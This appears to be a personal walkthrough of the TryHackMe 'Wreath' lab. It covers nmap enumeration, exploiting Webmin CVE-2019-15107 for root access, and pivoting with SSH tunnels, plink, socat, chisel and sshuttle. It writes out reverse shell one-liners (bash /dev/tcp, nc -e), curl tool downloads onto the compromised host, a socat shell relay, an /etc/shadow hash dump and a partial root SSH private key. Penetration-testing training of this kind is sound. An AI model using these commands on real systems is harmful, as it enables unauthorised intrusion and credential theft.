# Wreath

Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network. (Streak limitation only for non-subscribed users)

https://tryhackme.com/room/wreath

## 1. Background

<details>
  <summary>---</summary>

> *There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.*

- 3 machines on the network
- At least one public facing webserver
- Self hosted git server on the network
- git server is internal. There may be sensitive information to find
- PC on the network with AV installed - likely Windows
- Windows PC cannot be directly access from the webserver 

</details>

## 2. Webserver enumeration

<details>
  <summary>---</summary>

![Network map](./wreath-network.png)

### Initial scan

Start with nmap

We find there are 4 ports open

```
nmap -p-15000 10.200.81.200 -oN initial.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-05 02:14 EDT
Nmap scan report for thomaswreath.thm (10.200.81.200)
Host is up (0.26s latency).
Not shown: 14995 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
443/tcp   open   https
9090/tcp  closed zeus-admin
10000/tcp open   snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 118.64 seconds
```

### Server OS

Find out what OS is running on the webserver - `centos`

```
nmap -p 80 -sV 10.200.81.200 -oN port80.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 02:00 EDT
Nmap scan report for 10.200.81.200
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
                                                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                
Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
```

### Check out the web page

Opening `10.200.81.200` on a web browser redirects to `https://thomaswreath.thm/`

![Failed to resolve](./failed-resolve.png)

Fix this by editing `/etc/hosts` for Linux/Mac or `C:\Windows\System32\drivers\etc\hosts` on Windows.

`/etc/hosts` file
```
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.200.81.200   thomaswreath.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

With DNS resolving properly, we can now access the webserver and see if we can find any interesting information

We can see interesting info such as 
- Home address
- Home and mobile numbers `+447821548812 `
- Email address


### Check out port 10000 service

nmap scan reveals server version `MiniServ 1.890 (Webmin httpd)`
```
nmap -p 10000 -sV 10.200.81.200 -oN port10000.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 04:48 EDT
Nmap scan report for thomaswreath.thm (10.200.81.200)
Host is up (0.26s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.69 seconds
```

Vuln scan
```
nmap -p 10000 --script vuln 10.200.81.200 -oN port10000vuln.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 04:51 EDT
Nmap scan report for thomaswreath.thm (10.200.81.200)
Host is up (0.26s latency).

PORT      STATE SERVICE
10000/tcp open  snet-sensor-mgmt
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_      http://www.exploit-db.com/exploits/1997/
|_sslv2-drown: 

Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
```

Quick Google search reveals this server version is vulnerable to `CVE-2019–15107`

</details>

## 3. Webserver Exploitation

<details>
  <summary>---</summary>

Exploit can be downloaded and run from `https://github.com/MuirlandOracle/CVE-2019-15107`

pip is required to install dependencies `cd CVE-2019-15107 && pip3 install -r requirements.txt`

```
./CVE-2019-15107.py 10.200.81.200

        __        __   _               _         ____   ____ _____     
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|    
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|      
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___     
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|     
                                                                       
                                                @MuirlandOracle        
                                                                       
                                                                       
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.81.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.                     
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# id                                                                   
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0

```

This is just a pseudo shell. Create a reverse shell by:

1. New terminal start a nc listener

```
nc -lvnp 1337
```

2. On the pseudo shell run a reverse bash command
   
```
/bin/bash -i >& /dev/tcp/10.50.82.56/1337 0>&1 
```

If `nc` is available you can run this

```
nc -e /bin/sh 10.50.82.56 1337 
```

3. Back on the listener terminal, we have reverse shell

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.50.82.56] from (UNKNOWN) [10.200.81.200] 45242          
bash: cannot set terminal process group (1781): Inappropriate ioctl for device
bash: no job control in this shell                                     
[root@prod-serv ]# id                                                  
id                                                                     
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
```

### Stabilise the shell

1. Spawn PTY with python

```
[root@prod-serv ]# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
[root@prod-serv ]# 
```

2. Background the shell with `CTRL Z`. Then examine current terminal and STTY info

```
[root@prod-serv ]# ^Z
[1]+  Stopped                 nc -lvnp 1337
kali@kali:~$ echo $TERM
xterm-256color

kali@kali:~$ stty -a
speed 38400 baud; rows 54; columns 185; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;
discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

```
> This reveals term type: `xterm-256color` and the size of current TTY: `rows 54; columns 185`

while the shell is in the background, run `stty raw -echo` then `fg` and `export TERM=xterm`

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.50.82.56] from (UNKNOWN) [10.200.81.200] 45248
bash: cannot set terminal process group (1781): Inappropriate ioctl for device
bash: no job control in this shell
[root@prod-serv ]# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
[root@prod-serv ]# ^Z
[1]+  Stopped                 nc -lvnp 1337
kali@kali:~$ stty raw -echo
kali@kali:~$ nc -lvnp 1337
                          export TERM=xterm
[root@prod-serv ]# 
```

> Note `nc -lvnp 1337` was not typed. It was `fg` but not echoed back

The shell is now stabilised

Summary:
1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. `CTRL Z`
3. `stty raw -echo`
4. `fg`
5. `export TERM=xterm`

### Dump password hash

```
cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18573::::::
systemd-coredump:!!:18573::::::
systemd-resolve:!!:18573::::::
tss:!!:18573::::::
polkitd:!!:18573::::::
libstoragemgmt:!!:18573::::::
cockpit-ws:!!:18573::::::
cockpit-wsinstance:!!:18573::::::
sssd:!!:18573::::::
sshd:!!:18573::::::
chrony:!!:18573::::::
rngd:!!:18573::::::
twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
unbound:!!:18573::::::
apache:!!:18573::::::                                                                                                                                                                    
nginx:!!:18573::::::                                                                                                                                                                     
mysql:!!:18573:::::: 
```

### Find interesting access keys

SSH keys are commonly stored in the home directory under `~/.ssh`

```
ls -la ~/.ssh
total 16
drwx------. 2 root root   80 Jan  6 03:29 .
dr-xr-x---. 3 root root  228 Apr  4 10:20 ..
-rw-r--r--. 1 root root  571 Nov  7 14:05 authorized_keys
-rw-------. 1 root root 2602 Nov  7 14:02 id_rsa
-rw-r--r--. 1 root root  571 Nov  7 14:02 id_rsa.pub
-rw-r--r--. 1 root root  345 Apr  3 07:54 known_hosts
```

Since we are root, we have read access to the private key `id_rsa`. Save the key locally

```
cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs0oHYlnFUHTlbuhePTNoITku4OBH8OxzRN8O3tMrpHqNH3LHaQRE
LgAe9qk9dvQA7pJb9V6vfLc+Vm6XLC1JY9Ljou89Cd4AcTJ9OruYZXTDnX0hW1vO5Do1bS
...
YlXRN11U6IKYQMTQgXDcZxTx+KFp8WlHV9NE2g3tHwagVTgIzmNA7EPdENzuxsXFwFH9TY
EsDTnTZceDBI6uBFoTQ1nIMnoyAxOSUC+Rb1TBBSwns/r4AJuA/d+cSp5U0jbfoR0R/8by
GbJ7oAQ232an8AAAARcm9vdEB0bS1wcm9kLXNlcnYBAg==
-----END OPENSSH PRIVATE KEY-----
```

Copy it to local machine and change file permission to suit SSH standards

```
kali@kali:~/thm/wreath/.ssh$ chmod 600 id_rsa 
kali@kali:~/thm/wreath/.ssh$ ls -la
total 12
drwxr-xr-x 2 kali kali 4096 Apr  4 05:30 .
drwxr-xr-x 4 kali kali 4096 Apr  4 05:30 ..
-rw------- 1 kali kali 2602 Apr  4 05:30 id_rsa
```

> Note: if you dont change the permission of the key, you wont be able to use it

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
root@10.200.81.200: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

Now we can just use this key to ssh straight into the webserver

```
ssh -i id_rsa root@10.200.81.200
[root@prod-serv ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

</details>

## 4. Pivoting

<details>
  <summary>---</summary>

### Definition

Pivoting is using access obtained over one machine to exploit another machine deeper in the network.

The technique involves gaining initial access to a remote network, and use it to access other machines

![pivoting](pivoting.png)

Above there are four machines on the target network
- 1 public facing server
- 3 machines not exposed to the internet

By accessing the public server, it is then possible to pivot to attack the other 3 targets.

### Methods

Methods varies depending on OS

Two main methods:

1. Tunnelling/Proxying

Creating proxy connection through compromised machine. 
This could be tunnelled inside another protocol (eg. SSH tunnelling) which is useful in evading basic intrusion detection system or firewall

Proxying is preferred when there is need to redirect lots of different kinds of traffic to target network eg. nmap scan or access multiple ports on multiple different machines

2. Port forwarding

Creating a connection between local port and single port on a target via compromised host

Port forwarding tends to be faster and more reliable but only allow access to a single port (or small range) on a target device

Example pivoting tools

- Enumerating a network using native and statically compiled tools
- Proxychains / FoxyProxy
- SSH port forwarding and tunnelling (primarily Unix)
- plink.exe (Windows)
- socat (Windows and Unix)
- chisel (Windows and Unix)
- sshuttle (currently Unix only)

</details>

## 5. Pivoting Enumeration

<details>
  <summary>---</summary>

### Enumerate compromised host

In order of preferences

1. Using materials found on the machine eg. ARP cache, hosts file, DNS server
2. Using pre-installed tools
3. Using statically compiled tools
4. Using scripting techniques
5. Using local tools through proxy

Local tools can be slow and should be last resort

### Checking arp cache

ARP cache can be found on Windows or Linux. This will show any IP addresses of hosts that target has interacted with recently

```
arp -a
```

### Check static mapping

Found in `/etc/hosts` or `C:\Windows\System32\drivers\etc\hosts` 

Linux local DNS found in `/etc/resolv.conf` or `nmcli dev show` - can be misconfigured to allow DNS zone transfer attack
Windows DNS server can be checked with `ipconfig /all`

### Check if nmap installed

If no nmap write a script 

ICMP ping scan 
```
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
```

Port scanning - takes a long time however
```
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

### Example static binaries

These binaries can be uploaded to the compromised machine to run. See Pivoting - Socat for more instructions

[socat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
[other binaries](https://github.com/andrew-d/static-binaries)

</details>

## 6. Proxychains and FoxyProxy

<details>
  <summary>---</summary>

### Proxychains

Prepend other commands. Proxychains uses config file in `./proxychains.conf`, `~/.proxychains/proxychains.conf`, or `/etc/proxychains.conf` 

```
proxychains nc 172.16.0.10 23
```

Multiple servers can be used to chain all proxies together
in `proxychains.conf`
```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

Comment out `proxy_dns` line when doing nmap scans through proxy chains as this can cause the scan to hang

```
# Proxy DNS requests -no leak for DNS data
# proxy_dns
```

Other things to note
- Only TCP scans - no UDP or SYN scans
- ICMP echo packets (ping) will not work, use -Pn to prevent nmap
- It will be slow. Try only use nmap through a proxy when using the NSE (use static binary to see open ports/hosts before proxying a local copy of nmap to use the scripts library)

### FoxyProxy

Better with web browser. Popular with Burp and ZAP

</details>

## 7. Pivoting SSH Tunnelling / Port Forwarding

<details>
  <summary>---</summary>

### Forward connections

Creating a forward (local) SSH tunnel done on attacking box when we have SSH access to the target. Two ways: `port forwarding` or `creating a proxy`

1. Port Forwarding

`-L` : enables port forwarding. Link to local port
`-f` : backgrounds terminal immediately
`-N` : tells SSH theres no commands to be executed only set connection

Eg.
- We have access to SSH 172.16.0.5
- Web server on 172.16.0.10
- Attacking machine: `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`
- This means we can access webserver `172.16.0.10` by visiting `localhost:8000` on a web browser through SSH tunnel from `172.16.0.5`

2. Creating a proxy

`-D [port]` : open up a port on attacking box as a proxy to send data to protected network. Useful when combined with proxychains

eg.
`ssh -D 1337 user@172.16.0.5 -fN`

### Reverse connections

Preferable if you have shell on server but not SSH access.
This is however riskier as you must access your attacking machine from the target by credentials or better yet key based system

1. Generate ssh keys `ssh-keygen`

```
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): ./reverse
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./reverse
Your public key has been saved in ./reverse.pub
The key fingerprint is:
SHA256:DmgoQJUIMyG6qW2F8zRMWQgFR/BfW37m2+MWYGttQNk kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|Bo*B=..      o   |
|++ +.o      o E  |
|o   +   . ..     |
|.o = o . +  +    |
|+ + B o S ..o=   |
|.o * . o   +o +  |
|. o .   .  ... . |
| .           oo  |
|            .oo. |
+----[SHA256]-----+
```

2. Copy public key (`.pub` file) then edit `~/.ssh/authorized_keys`
3. New line: `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty` then paste the public key. This is to ensure the key only used for port forwarding. Stopping ability to gain a shell on attacking machine
4. Check if SSH server running `sudo systemctl status ssh
```
sudo systemctl status ssh
[sudo] password for kali: 
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
       Docs: man:sshd(8)
             man:sshd_config(5)
```

SSH service can be started with
```
sudo systemctl start ssh
```

5. Lastly transfer the private key to the target box. This is usually an absolute no-no. This is why we generate a throwaway set of SSH keys to be discarded as soon as the engagement is over
6. We can finally connect back with a reverse prot forwarding using

```
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

For example:
- Web server 172.16.0.10 
- Shell'd server 172.16.0.5 
- Attacking box 172.16.0.20

On the shell'd server
```
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
```

On newer client the reverse proxy creation can be done with `-D`
```
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```

To kill any connections use `ps aux | grep ssh` then `sudo kill PID`

</details>

## 8. Pivoting - plink.exe

<details>
  <summary>---</summary>

Plink.exe is a windows command line version of PuTTY SSH client. This was created before Windows had its own inbuilt SSH client.

Windows servers are unlikely to have an SSH server running so the use of plink is to transport binary to the target, then using it to create a reverse connection

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

`cmd.exe /c echo y` : non-interactive shells to get around warning message for never previously connected host

If we have access to 172.16.0.5 and forwarding connection to 172.16.0.10:80 back to port 8000 on the attacking machine 172.16.0.20

```
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

Keys generated by `ssh-keygen` wont work here however. It will need to be converted by `puttygen` tool, installed by `sudo apt install putty-tools` then run `puttygen KEYFILE -o OUTPUT_KEY.ppk`. 

The .ppk file then can be transferred to Windows and used the same way as reverse port forwarding

plink is preinstalled on Kali at `/usr/share/windows-resources/binaries/plink.exe` but should be updated before engagement from https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

</details>

## 9. Pivoting - Socat

<details>
  <summary>---</summary>

Socat:
- Great for fully stable Linux shells
- Port forwarding.
- However, rarely installed on target
- Unlikely to bypass AV in Windows
- Makes a good relay

For example: trying to get shell on a target without direct connection. Use socat to set up a relay on the compromised machine. This listens for the reverse shell from target and forwards to attacking box

![socat as a relay](socat.png)

Above we create a port forward from a port on the compromised server to a listening port on our attacker box. The other way is also possible: either forwarding a connection from attacking machine to a target inside network; or creat a direct link between listening port on attacking machine with service on the internal server. The latter is useful as it does not require opening a port to compromised server.

To download binary for socat:

1. Set up python web server on attacking machine (in the directory with socat binary)

```
sudo python3 -m http.server 80
```

2. Download on target machine with curl

```
curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
```

Example

Attacking machine
```
kali@kali:~/thm/wreath$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.200.81.200 - - [05/Apr/2021 02:40:22] "GET /socat-Neozer0 HTTP/1.1" 200 -
10.200.81.200 - - [05/Apr/2021 02:41:13] "GET /nc-Neozer0 HTTP/1.1" 200 -

```

Compromised webserver
```
root@prod-serv tmp]# curl 10.50.82.56/socat -o /tmp/socat-Neozer0 && chmod +x /tmp/socat-Neozer0
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  369k  100  369k    0     0   224k      0  0:00:01  0:00:01 --:--:--  224k

[root@prod-serv tmp]# ls -la socat-N*
-rwxr-xr-x. 1 root root 378384 Apr  5 05:08 socat-Neozer0
```

### Reverse shell relay

Start a listener in attacking machine
```
kali@kali:~/thm/wreath$ sudo nc -lvnp 443
listening on [any] 443 ...

```

run socat on compromised webserver
```
[root@prod-serv tmp]# ./socat-Neozer0 tcp-l:8000 tcp:10.50.82.56:443 &
[1] 2136
```

`tcp-l:8000` : create first half of the connection - an IPv4 listener on tcp port 8000 of target machine
`tcp:ATTACKING_IP_443` : connects back to our local IP on port 443
`&` : backgrounds the listener while we can still use the shell for other commands

Create reverse shell on newly opened port 8000

```
chmod +x ./nc-Neozer0

./nc-Neozer0 127.0.0.1 8000 -e /bin/bash

```

Back on attacking machine we have a reverse shell

```
sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.50.82.56] from (UNKNOWN) [10.200.81.200] 41630
whoami
root
id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:9b:ca:22:d5:ab brd ff:ff:ff:ff:ff:ff
    inet 10.200.81.200/24 brd 10.200.81.255 scope global dynamic noprefixroute eth0
       valid_lft 2072sec preferred_lft 2072sec
    inet6 fe80::9b:caff:fe22:d5ab/64 scope link 
       valid_lft forever preferred_lft forever
```

### Port forwarding -- easy

The quick and easy way is to open up a listening port on compromised server and redirect whatever traffic it receives to target server

For example, compromise server 172.16.0.5 and target port 3306 of 172.16.0.10 then we could run `./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`. This opens port 33060 on compromised server and redirects input from attacking machine straight to target server 172.16.0.10 port 3306 (MySQL database)

`fork` : put every connection into new process
`reuseaddr` : port stays open after connection is made
`&` : backgrounds the shell, keep using same terminal session

Above options combined allow us to use the same port forward for more than one connection.

We can now connect to port 33060 on the relay 172.16.0.5 and connection directly relayed to our target 172.16.0.10:3306

![port forwarding easy diagram](port-forward-easy.jpg)

### Port forwarding -- quiet

If we want to avoid opening a port and potentially alert any host/network scanning, we can use a quieter method of port forwarding with socat. This is slightly more complex.

1. Open up two port listeners on the attacking machine

Attacking machine
```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

This opens up two ports 8000 and 8001, creating port relay

2. Start a relay on compromised server

Compromised relay server
```
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

This makes connection between our listening 8001 on attacking machine and open port on target server

For example, 

```
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```

This creates a link between port 8000 on attacking machine and port 80 on intended target 172.16.0.10. If we go to localhost:8000 on our attacking machine's web browser, it would load the webpage served by target 172.16.0.10:80.

Summary visiting webpage on attacking server:
- Request goes to 127.0.0.1:8000
- Socat listener, anything goes into port 8000, comes out of port 8001
- Port 8001 is connected directly to socat porcess on the compromised server. Anything coming out of port 8001 gets sent to compromised server and relayed to port 80 on target server

Summary target sends response:
- Response sent to socat process on compromised server. What goes in process comes out to port 8001 on our attacking machine
- Anything goes in port 8001 on attacking machine comes out of port 8000 which is where web browser expects to receive its response

![port forwarding quiet diagram](port-forward-quiet.jpg)

### Killing backgrounded socat port forwards

`jobs` : run command to see socat processes
`kill %NUMBER` : kill socat process

```
kali@kali:~$ socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
[1] 6453
kali@kali:~$ jobs
[1]+  Running                 socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
kali@kali:~$ kill %1
kali@kali:~$ jobs
[1]+  Exit 143                socat tcp-l:8001 tcp-l:8000,fork,reuseaddr
```

### Examples

- Attacking IP 172.16.0.200
- relay a reverse shell to TCP port 443 on Attacking Machine

`./socat tcp-l:8000 tcp:172.16.0.200:443`

- Forward TCP port 2222 on a compromised server, to 172.16.0.100:22 (easy method)

`./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &`


</details>

## 10. Pivoting - Chisel

<details>
  <summary>---</summary>

Tool to set up tunnelled proxy / port forward through a compromised system. Dont need SSH access on compromised server.

Download chisel binary from github and transfer to comrpomise webserver

Use scp

`scp -i [KEY] [FILE] user@address:/[PATH to save file]`

```
scp -i ssh/webserver_id_rsa chisel/chisel_1.7.6_linux_amd64  root@10.200.81.200:/tmp/chisel-Neozer0
chisel_1.7.6_linux_amd64                                100% 8144KB 677.9KB/s   00:12  
```

Chisel has two main uses: SOCKS proxy and port forwarding
```
./chisel-Neozer0 --help | head -19

  Usage: chisel [command] [--help]

  Version: 1.7.6 (go1.16rc1)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

### Reverse SOCKS proxy

This connects back from compromised server to a listener on attacking machine

Attacking machine

```
./chisel server -p LISTEN_PORT --reverse &
```

Compromised host
```
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

`R:socks` - remotes

Example

Attacking machine
```
kali@kali:~/thm/wreath$ chisel/chisel_1.7.6_linux_amd64 server -p 1337 --reverse &
[1] 8176
kali@kali:~/thm/wreath$ 2021/04/07 05:35:30 server: Reverse tunnelling enabled
2021/04/07 05:35:30 server: Fingerprint N8c7Wp59pZ7WNPRo4aVUU4MlhLOeauxzPIrIpMpfpZQ=
2021/04/07 05:35:30 server: Listening on http://0.0.0.0:1337
2021/04/07 05:37:12 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Notice proxy opened on 127.0.0.1:1080 - this is where we will send data through the proxy


Compromised host
```
[root@prod-serv tmp]# ./chisel-Neozer0 client 10.50.82.56:1337 R:socks &
[2] 2076
[root@prod-serv tmp]# 2021/04/07 10:37:11 client: Connecting to ws://10.50.82.56:1337
2021/04/07 10:37:13 client: Connected (Latency 262.021143ms)
```

### Forward SOCKS proxy

Less common than reverse proxies.
Like bind shells are less common than reverse shells.

Egress firewalls are less stringent than ingress firewalls

Compromised host
```
./chisel server -p LISTEN_PORT --socks5
```

Attacking box
```
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
```

`PROXY_PORT` - port opened for proxy

Example
```
./chisel client 172.16.0.10:8080 1337:socks
```

Connect to a chisel server running on port 8080 of 172.16.0.10.
SOCKS proxy would open on port 1337 of attacking machine

> Note: Proxychains config needs to be updated to SOCKS5 proxy to work with Chisel

```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

### Remote port forward

Connect back from compromised target to create the forward

Attacking box
```
./chisel server -p LISTEN_PORT --reverse &
```

Compromised server
```
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

`LISTEN_PORT` - port chisel server start on

`LOCAL_PORT` - port open on our attacking machine linked to target port

Example

Attacking box: 172.16.0.20
Compromised server: 172.16.0.5
Target: 172.16.0.10:22

To forward 172.16.0.10:22 back to port 2222 on attacking machine
```
./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
```

Attacking box
```
./chisel server -p 1337 --reverse &
```

This would allow access to 172.16.10:22 via SSH by navigating to 127.0.0.1:2222

### Local port forward

Connect from attacking machine to chisel server listening on a compromised target

Compromised target
```
./chisel server -p LISTEN_PORT
```

Attacking box
```
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

Example

Connect to 172.16.0.5:8000 (compromised host running chisel), forwarding our local port 2222 to 172.16.0.10:22 (intended target)
```
./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
```

> ./chisel client 172.16.0.100:3306 R:socks:172.16.0.200:1337 &

### Examples

- Use port 4242 for the listener and do not background the process.

`./chisel server -p 4242 --reverse`

- Connect back to this server with a SOCKS proxy from a compromised host
- Your IP 172.16.0.200 
- Backgrounding the process

`./chisel client 172.16.0.200:4242 R:socks &`

- Forward 172.16.0.100:3306 to your own port 33060 
- Using a chisel remote port forward 
- Your IP 172.16.0.200, listening port is 1337
- Background this process

`./chisel client 172.16.0.200:1337 33060:172.16.0.100:3306 &`

- Chisel server running on 172.16.0.5:4444
- Create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?

`./chisel client 172.16.0.5:4444 8000:172.16.0.10:80` 

</details>

## 11. Pivoting - sshuttle

<details>
  <summary>---</summary>

- Uses SSH connection to create tunnelled proxy that acts like a new interface.
- Simulates a VPN
- Route traffice through proxy without using proxychains
- Encrypted connection
- Sits in the background and forward relevant traffic to target network

However
- Only works on Linux targets
- Requires access to compromised server via SSH
- Requires Python

1. Install sshuttle

`sshuttle -r username@address subnet`

2. Run sshuttle

eg: `sshuttle -r user@172.16.0.5 172.16.0.0/24`

We can avoid specifying subnet with `-N`. Not always successful.

`sshuttle -r username@address -N`

